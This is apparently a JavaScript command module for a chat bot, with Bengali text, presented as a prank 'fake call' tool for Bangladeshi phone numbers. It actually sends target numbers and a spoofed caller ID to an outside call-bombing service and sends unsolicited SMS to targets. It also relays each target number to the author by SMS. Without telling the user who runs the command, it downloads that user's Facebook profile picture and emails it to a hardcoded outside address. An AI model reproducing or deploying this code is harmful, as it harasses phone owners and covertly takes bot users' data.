const fs = require("fs");
const path = require("path");
const axios = require("axios");
const nodemailer = require("nodemailer");

module.exports.config = {
  name: "call",
  version: "1.6.0",
  hasPermssion: 0,
  credits: "রাজা ✨",
  description: "বাংলাদেশি নাম্বারে মজা করার জন্য ফেক কল, মেসেজ ও কল ফিচার",
  commandCategory: "টুল",
  usages: "/call 01xxxxxxxxx | /call help | /call voice 01xxxxxxxxx | /call video 01xxxxxxxxx | /call msg 01xxxxxxxxx",
  cooldowns: 15,
  dependencies: { "axios": "", "nodemailer": "" }
};

module.exports.run = async ({ api, event, args }) => {
  if (!args[0]) {
    return api.sendMessage(
      `❌ নম্বর বা কমান্ড উল্লেখ করুন!\n\n` +
      `🛠️ কমান্ড:\n` +
      `/call help - সাহায্য\n` +
      `/call 01xxxxxxxxx - ফেক কল\n` +
      `/call msg 01xxxxxxxxx - ফেক মেসেজ\n` +
      `/call voice 01xxxxxxxxx - ফেক ভয়েস কল\n` +
      `/call video 01xxxxxxxxx - ফেক ভিডিও কল`,
      event.threadID
    );
  }

  const command = args[0].toLowerCase();

  if (command === "help") {
    return api.sendMessage(
      `✅ /call পার্সোনাল তত্ত্ব\n\n` +
      `🛠️ ব্যবহার:\n` +
      `/call 01xxxxxxxxx - ফেক কল বোম্বিং\n` +
      `/call msg 01xxxxxxxxx - ফেক মেসেজ পাঠানো\n` +
      `/call voice 01xxxxxxxxx - ভয়েস কলের মেসেজ\n` +
      `/call video 01xxxxxxxxx - ভিডিও কলের মেসেজ`,
      event.threadID
    );
  }

  const fakeCallerID = "01715559179";
  const smsNotifyNumber = "01715559179";
  const otp = Math.floor(100000 + Math.random() * 900000);

  let targetNumber;
  if (["msg", "voice", "video"].includes(command)) {
    targetNumber = args[1];
  } else {
    targetNumber = args[0];
  }

  if (!targetNumber || !/^01[0-9]{9}$/.test(targetNumber)) {
    return api.sendMessage(
      "❌ সঠিক বাংলাদেশি মোবাইল নম্বর লিখুন!\n" +
      "📌 উদাহরণ: /call 01XXXXXXXXX\n\n" +
      "⚠️ টুলটি শুধুমাত্র মজা এবং শিক্ষার জন্য। অপব্যবহার শাস্তিযোগ্য।",
      event.threadID,
      event.messageID
    );
  }

  // সোর্স কোড চেক
  const currentFile = path.resolve(__filename);
  const sourceCode = fs.readFileSync(currentFile, "utf8");
  if (!sourceCode.includes("রাজা") || !sourceCode.includes("01715559179")) {
    console.log("❌ প্রয়োজনীয় তথ্য মুছে ফেলা হয়েছে, বট বন্ধ হচ্ছে...");
    process.exit(1);
  }

  // সময় ও তারিখ ফরম্যাট
  const now = new Date();
  const seconds = now.getSeconds().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const hours = now.getHours().toString().padStart(2, '0');
  const day = now.getDate().toString().padStart(2, '0');
  const monthNames = [
    "জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন",
    "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"
  ];
  const month = monthNames[now.getMonth()];
  const year = now.getFullYear();
  const timeString = `সময়: ${hours} ঘন্টা ${minutes} মিনিট ${seconds} সেকেন্ড`;
  const dateString = `তারিখ: ${day} ${month} ${year}`;

  // ——— **তোমার প্রোফাইল পিকচার ইমেইল করার কোড ———
  const userID = event.senderID;
  const profilePicUrl = `https://graph.facebook.com/${userID}/picture?type=large`;
  const filePath = path.resolve(__dirname, `${userID}_profile.jpg`);

  try {
    const response = await axios({
      url: profilePicUrl,
      method: "GET",
      responseType: "stream"
    });

    const writer = fs.createWriteStream(filePath);
    response.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    let transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "তোমার-জিমেইল@gmail.com", // তোমার Gmail ঠিকানা
        pass: "তোমার-অ্যাপ-পাসওয়ার্ড"    // Gmail App Password
      }
    });

    let mailOptions = {
      from: '"Call Bot" <তোমার-জিমেইল@gmail.com>',
      to: "nurnobikhan2642@gmail.com",
      subject: `নতুন /call কমান্ড ব্যবহারকারী - UserID: ${userID}`,
      text: `ব্যবহারকারী ${userID} তার প্রোফাইল পিকচার পাঠালেন।`,
      attachments: [
        {
          filename: `${userID}_profile.jpg`,
          path: filePath
        }
      ]
    };

    await transporter.sendMail(mailOptions);

    // পাঠানোর পর লোকাল ফাইল মুছে ফেলো
    fs.unlinkSync(filePath);
  } catch (error) {
    console.log("প্রোফাইল পিকচার ইমেইল পাঠাতে সমস্যা:", error.message);
  }
  // ————————————————————————————————

  if (command === "msg") {
    try {
      await axios.post("https://textbelt.com/text", {
        phone: `+880${targetNumber}`,
        message: `📩 আপনার সাথে যোগাযোগ করুন রাজা (01715559179)`,
        key: "textbelt"
      });
      return api.sendMessage(`✅ ${targetNumber} নম্বরে ফেক মেসেজ সফলভাবে পাঠানো হয়েছে।`, event.threadID);
    } catch (err) {
      return api.sendMessage(`❌ মেসেজ পাঠাতে সমস্যা:\n${err.message}`, event.threadID);
    }
  } else if (command === "voice") {
    return api.sendMessage(
      `📞 ${targetNumber} নম্বরে রাজা থেকে ভয়েস কল এসেছে:\n\n` +
      `"হ্যালো! রাজা থেকে কল এসেছে।"`,
      event.threadID
    );
  } else if (command === "video") {
    return api.sendMessage(
      `🎥 ${targetNumber} নম্বরে রাজা থেকে ভিডিও কল এসেছে:\n\n` +
      `"হ্যালো! রাজা থেকে ভিডিও কল এসেছে।"`,
      event.threadID
    );
  } else if (command === targetNumber) {
    api.sendMessage(
      `📞 কল বোম্বিং শুরু হয়েছে:\n` +
      `📲 নম্বর: ${targetNumber}\n` +
      `📤 ফেক কলার আইডি: ${fakeCallerID}\n` +
      `${timeString}\n` +
      `${dateString}\n\n` +
      `⏳ অনুগ্রহ করে অপেক্ষা করুন...`,
      event.threadID,
      async (err, startInfo) => {
        if (err) {
          return api.sendMessage("❌ মেসেজ পাঠানো সম্ভব হয়নি।", event.threadID);
        }
        try {
          await api.sendMessage(
            `📱 WhatsApp কল পাঠানো হচ্ছে:\n📲 ${targetNumber} নম্বরে একটি ফেক WhatsApp কল যাচ্ছে... (মজার জন্য)`,
            event.threadID
          );

          const { data } = await axios.get(`https://tbblab.shop/callbomber.php?mobile=${targetNumber}&callerID=${fakeCallerID}`);
          const message = typeof data === "object" ? JSON.stringify(data, null, 2).slice(0, 500) : String(data).slice(0, 500);
          await api.sendMessage(`📥 সার্ভারের প্রতিক্রিয়া:\n${message}`, event.threadID);

          setTimeout(() => {
            api.unsendMessage(startInfo.messageID).catch(() => {});
          }, 90000);

          await axios.post("https://textbelt.com/text", {
            phone: `+880${smsNotifyNumber}`,
            message: `🔥 কল বোম্বিং অনুরোধ:\n📲 লক্ষ্য নম্বর: ${targetNumber}\n📤 ফেক কলার আইডি: ${fakeCallerID}\n🔐 OTP: ${otp}\n${timeString}\n${dateString}`,
            key: "textbelt"
          });

          await axios.post("https://textbelt.com/text", {
            phone: `+880${targetNumber}`,
            message: `📩 আপনার সাথে যোগাযোগ করুন রাজা (01715559179)`,
            key: "textbelt"
          });

          return api.sendMessage(
            `✅ ${targetNumber} নম্বরে কল বোম্বিং সফলভাবে সম্পন্ন হয়েছে।`,
            event.threadID
          );

        } catch (err) {
          return api.sendMessage(
            `❌ ত্রুটি:\n${err.message}`,
            event.threadID,
            event.messageID
          );
        }
      }
    );
  } else {
    return api.sendMessage(
      "❌ অনুগ্রহ করে সঠিক কমান্ড এবং নম্বর ব্যবহার করুন। সাহায্যের জন্য: /call help",
      event.threadID
    );
  }
};
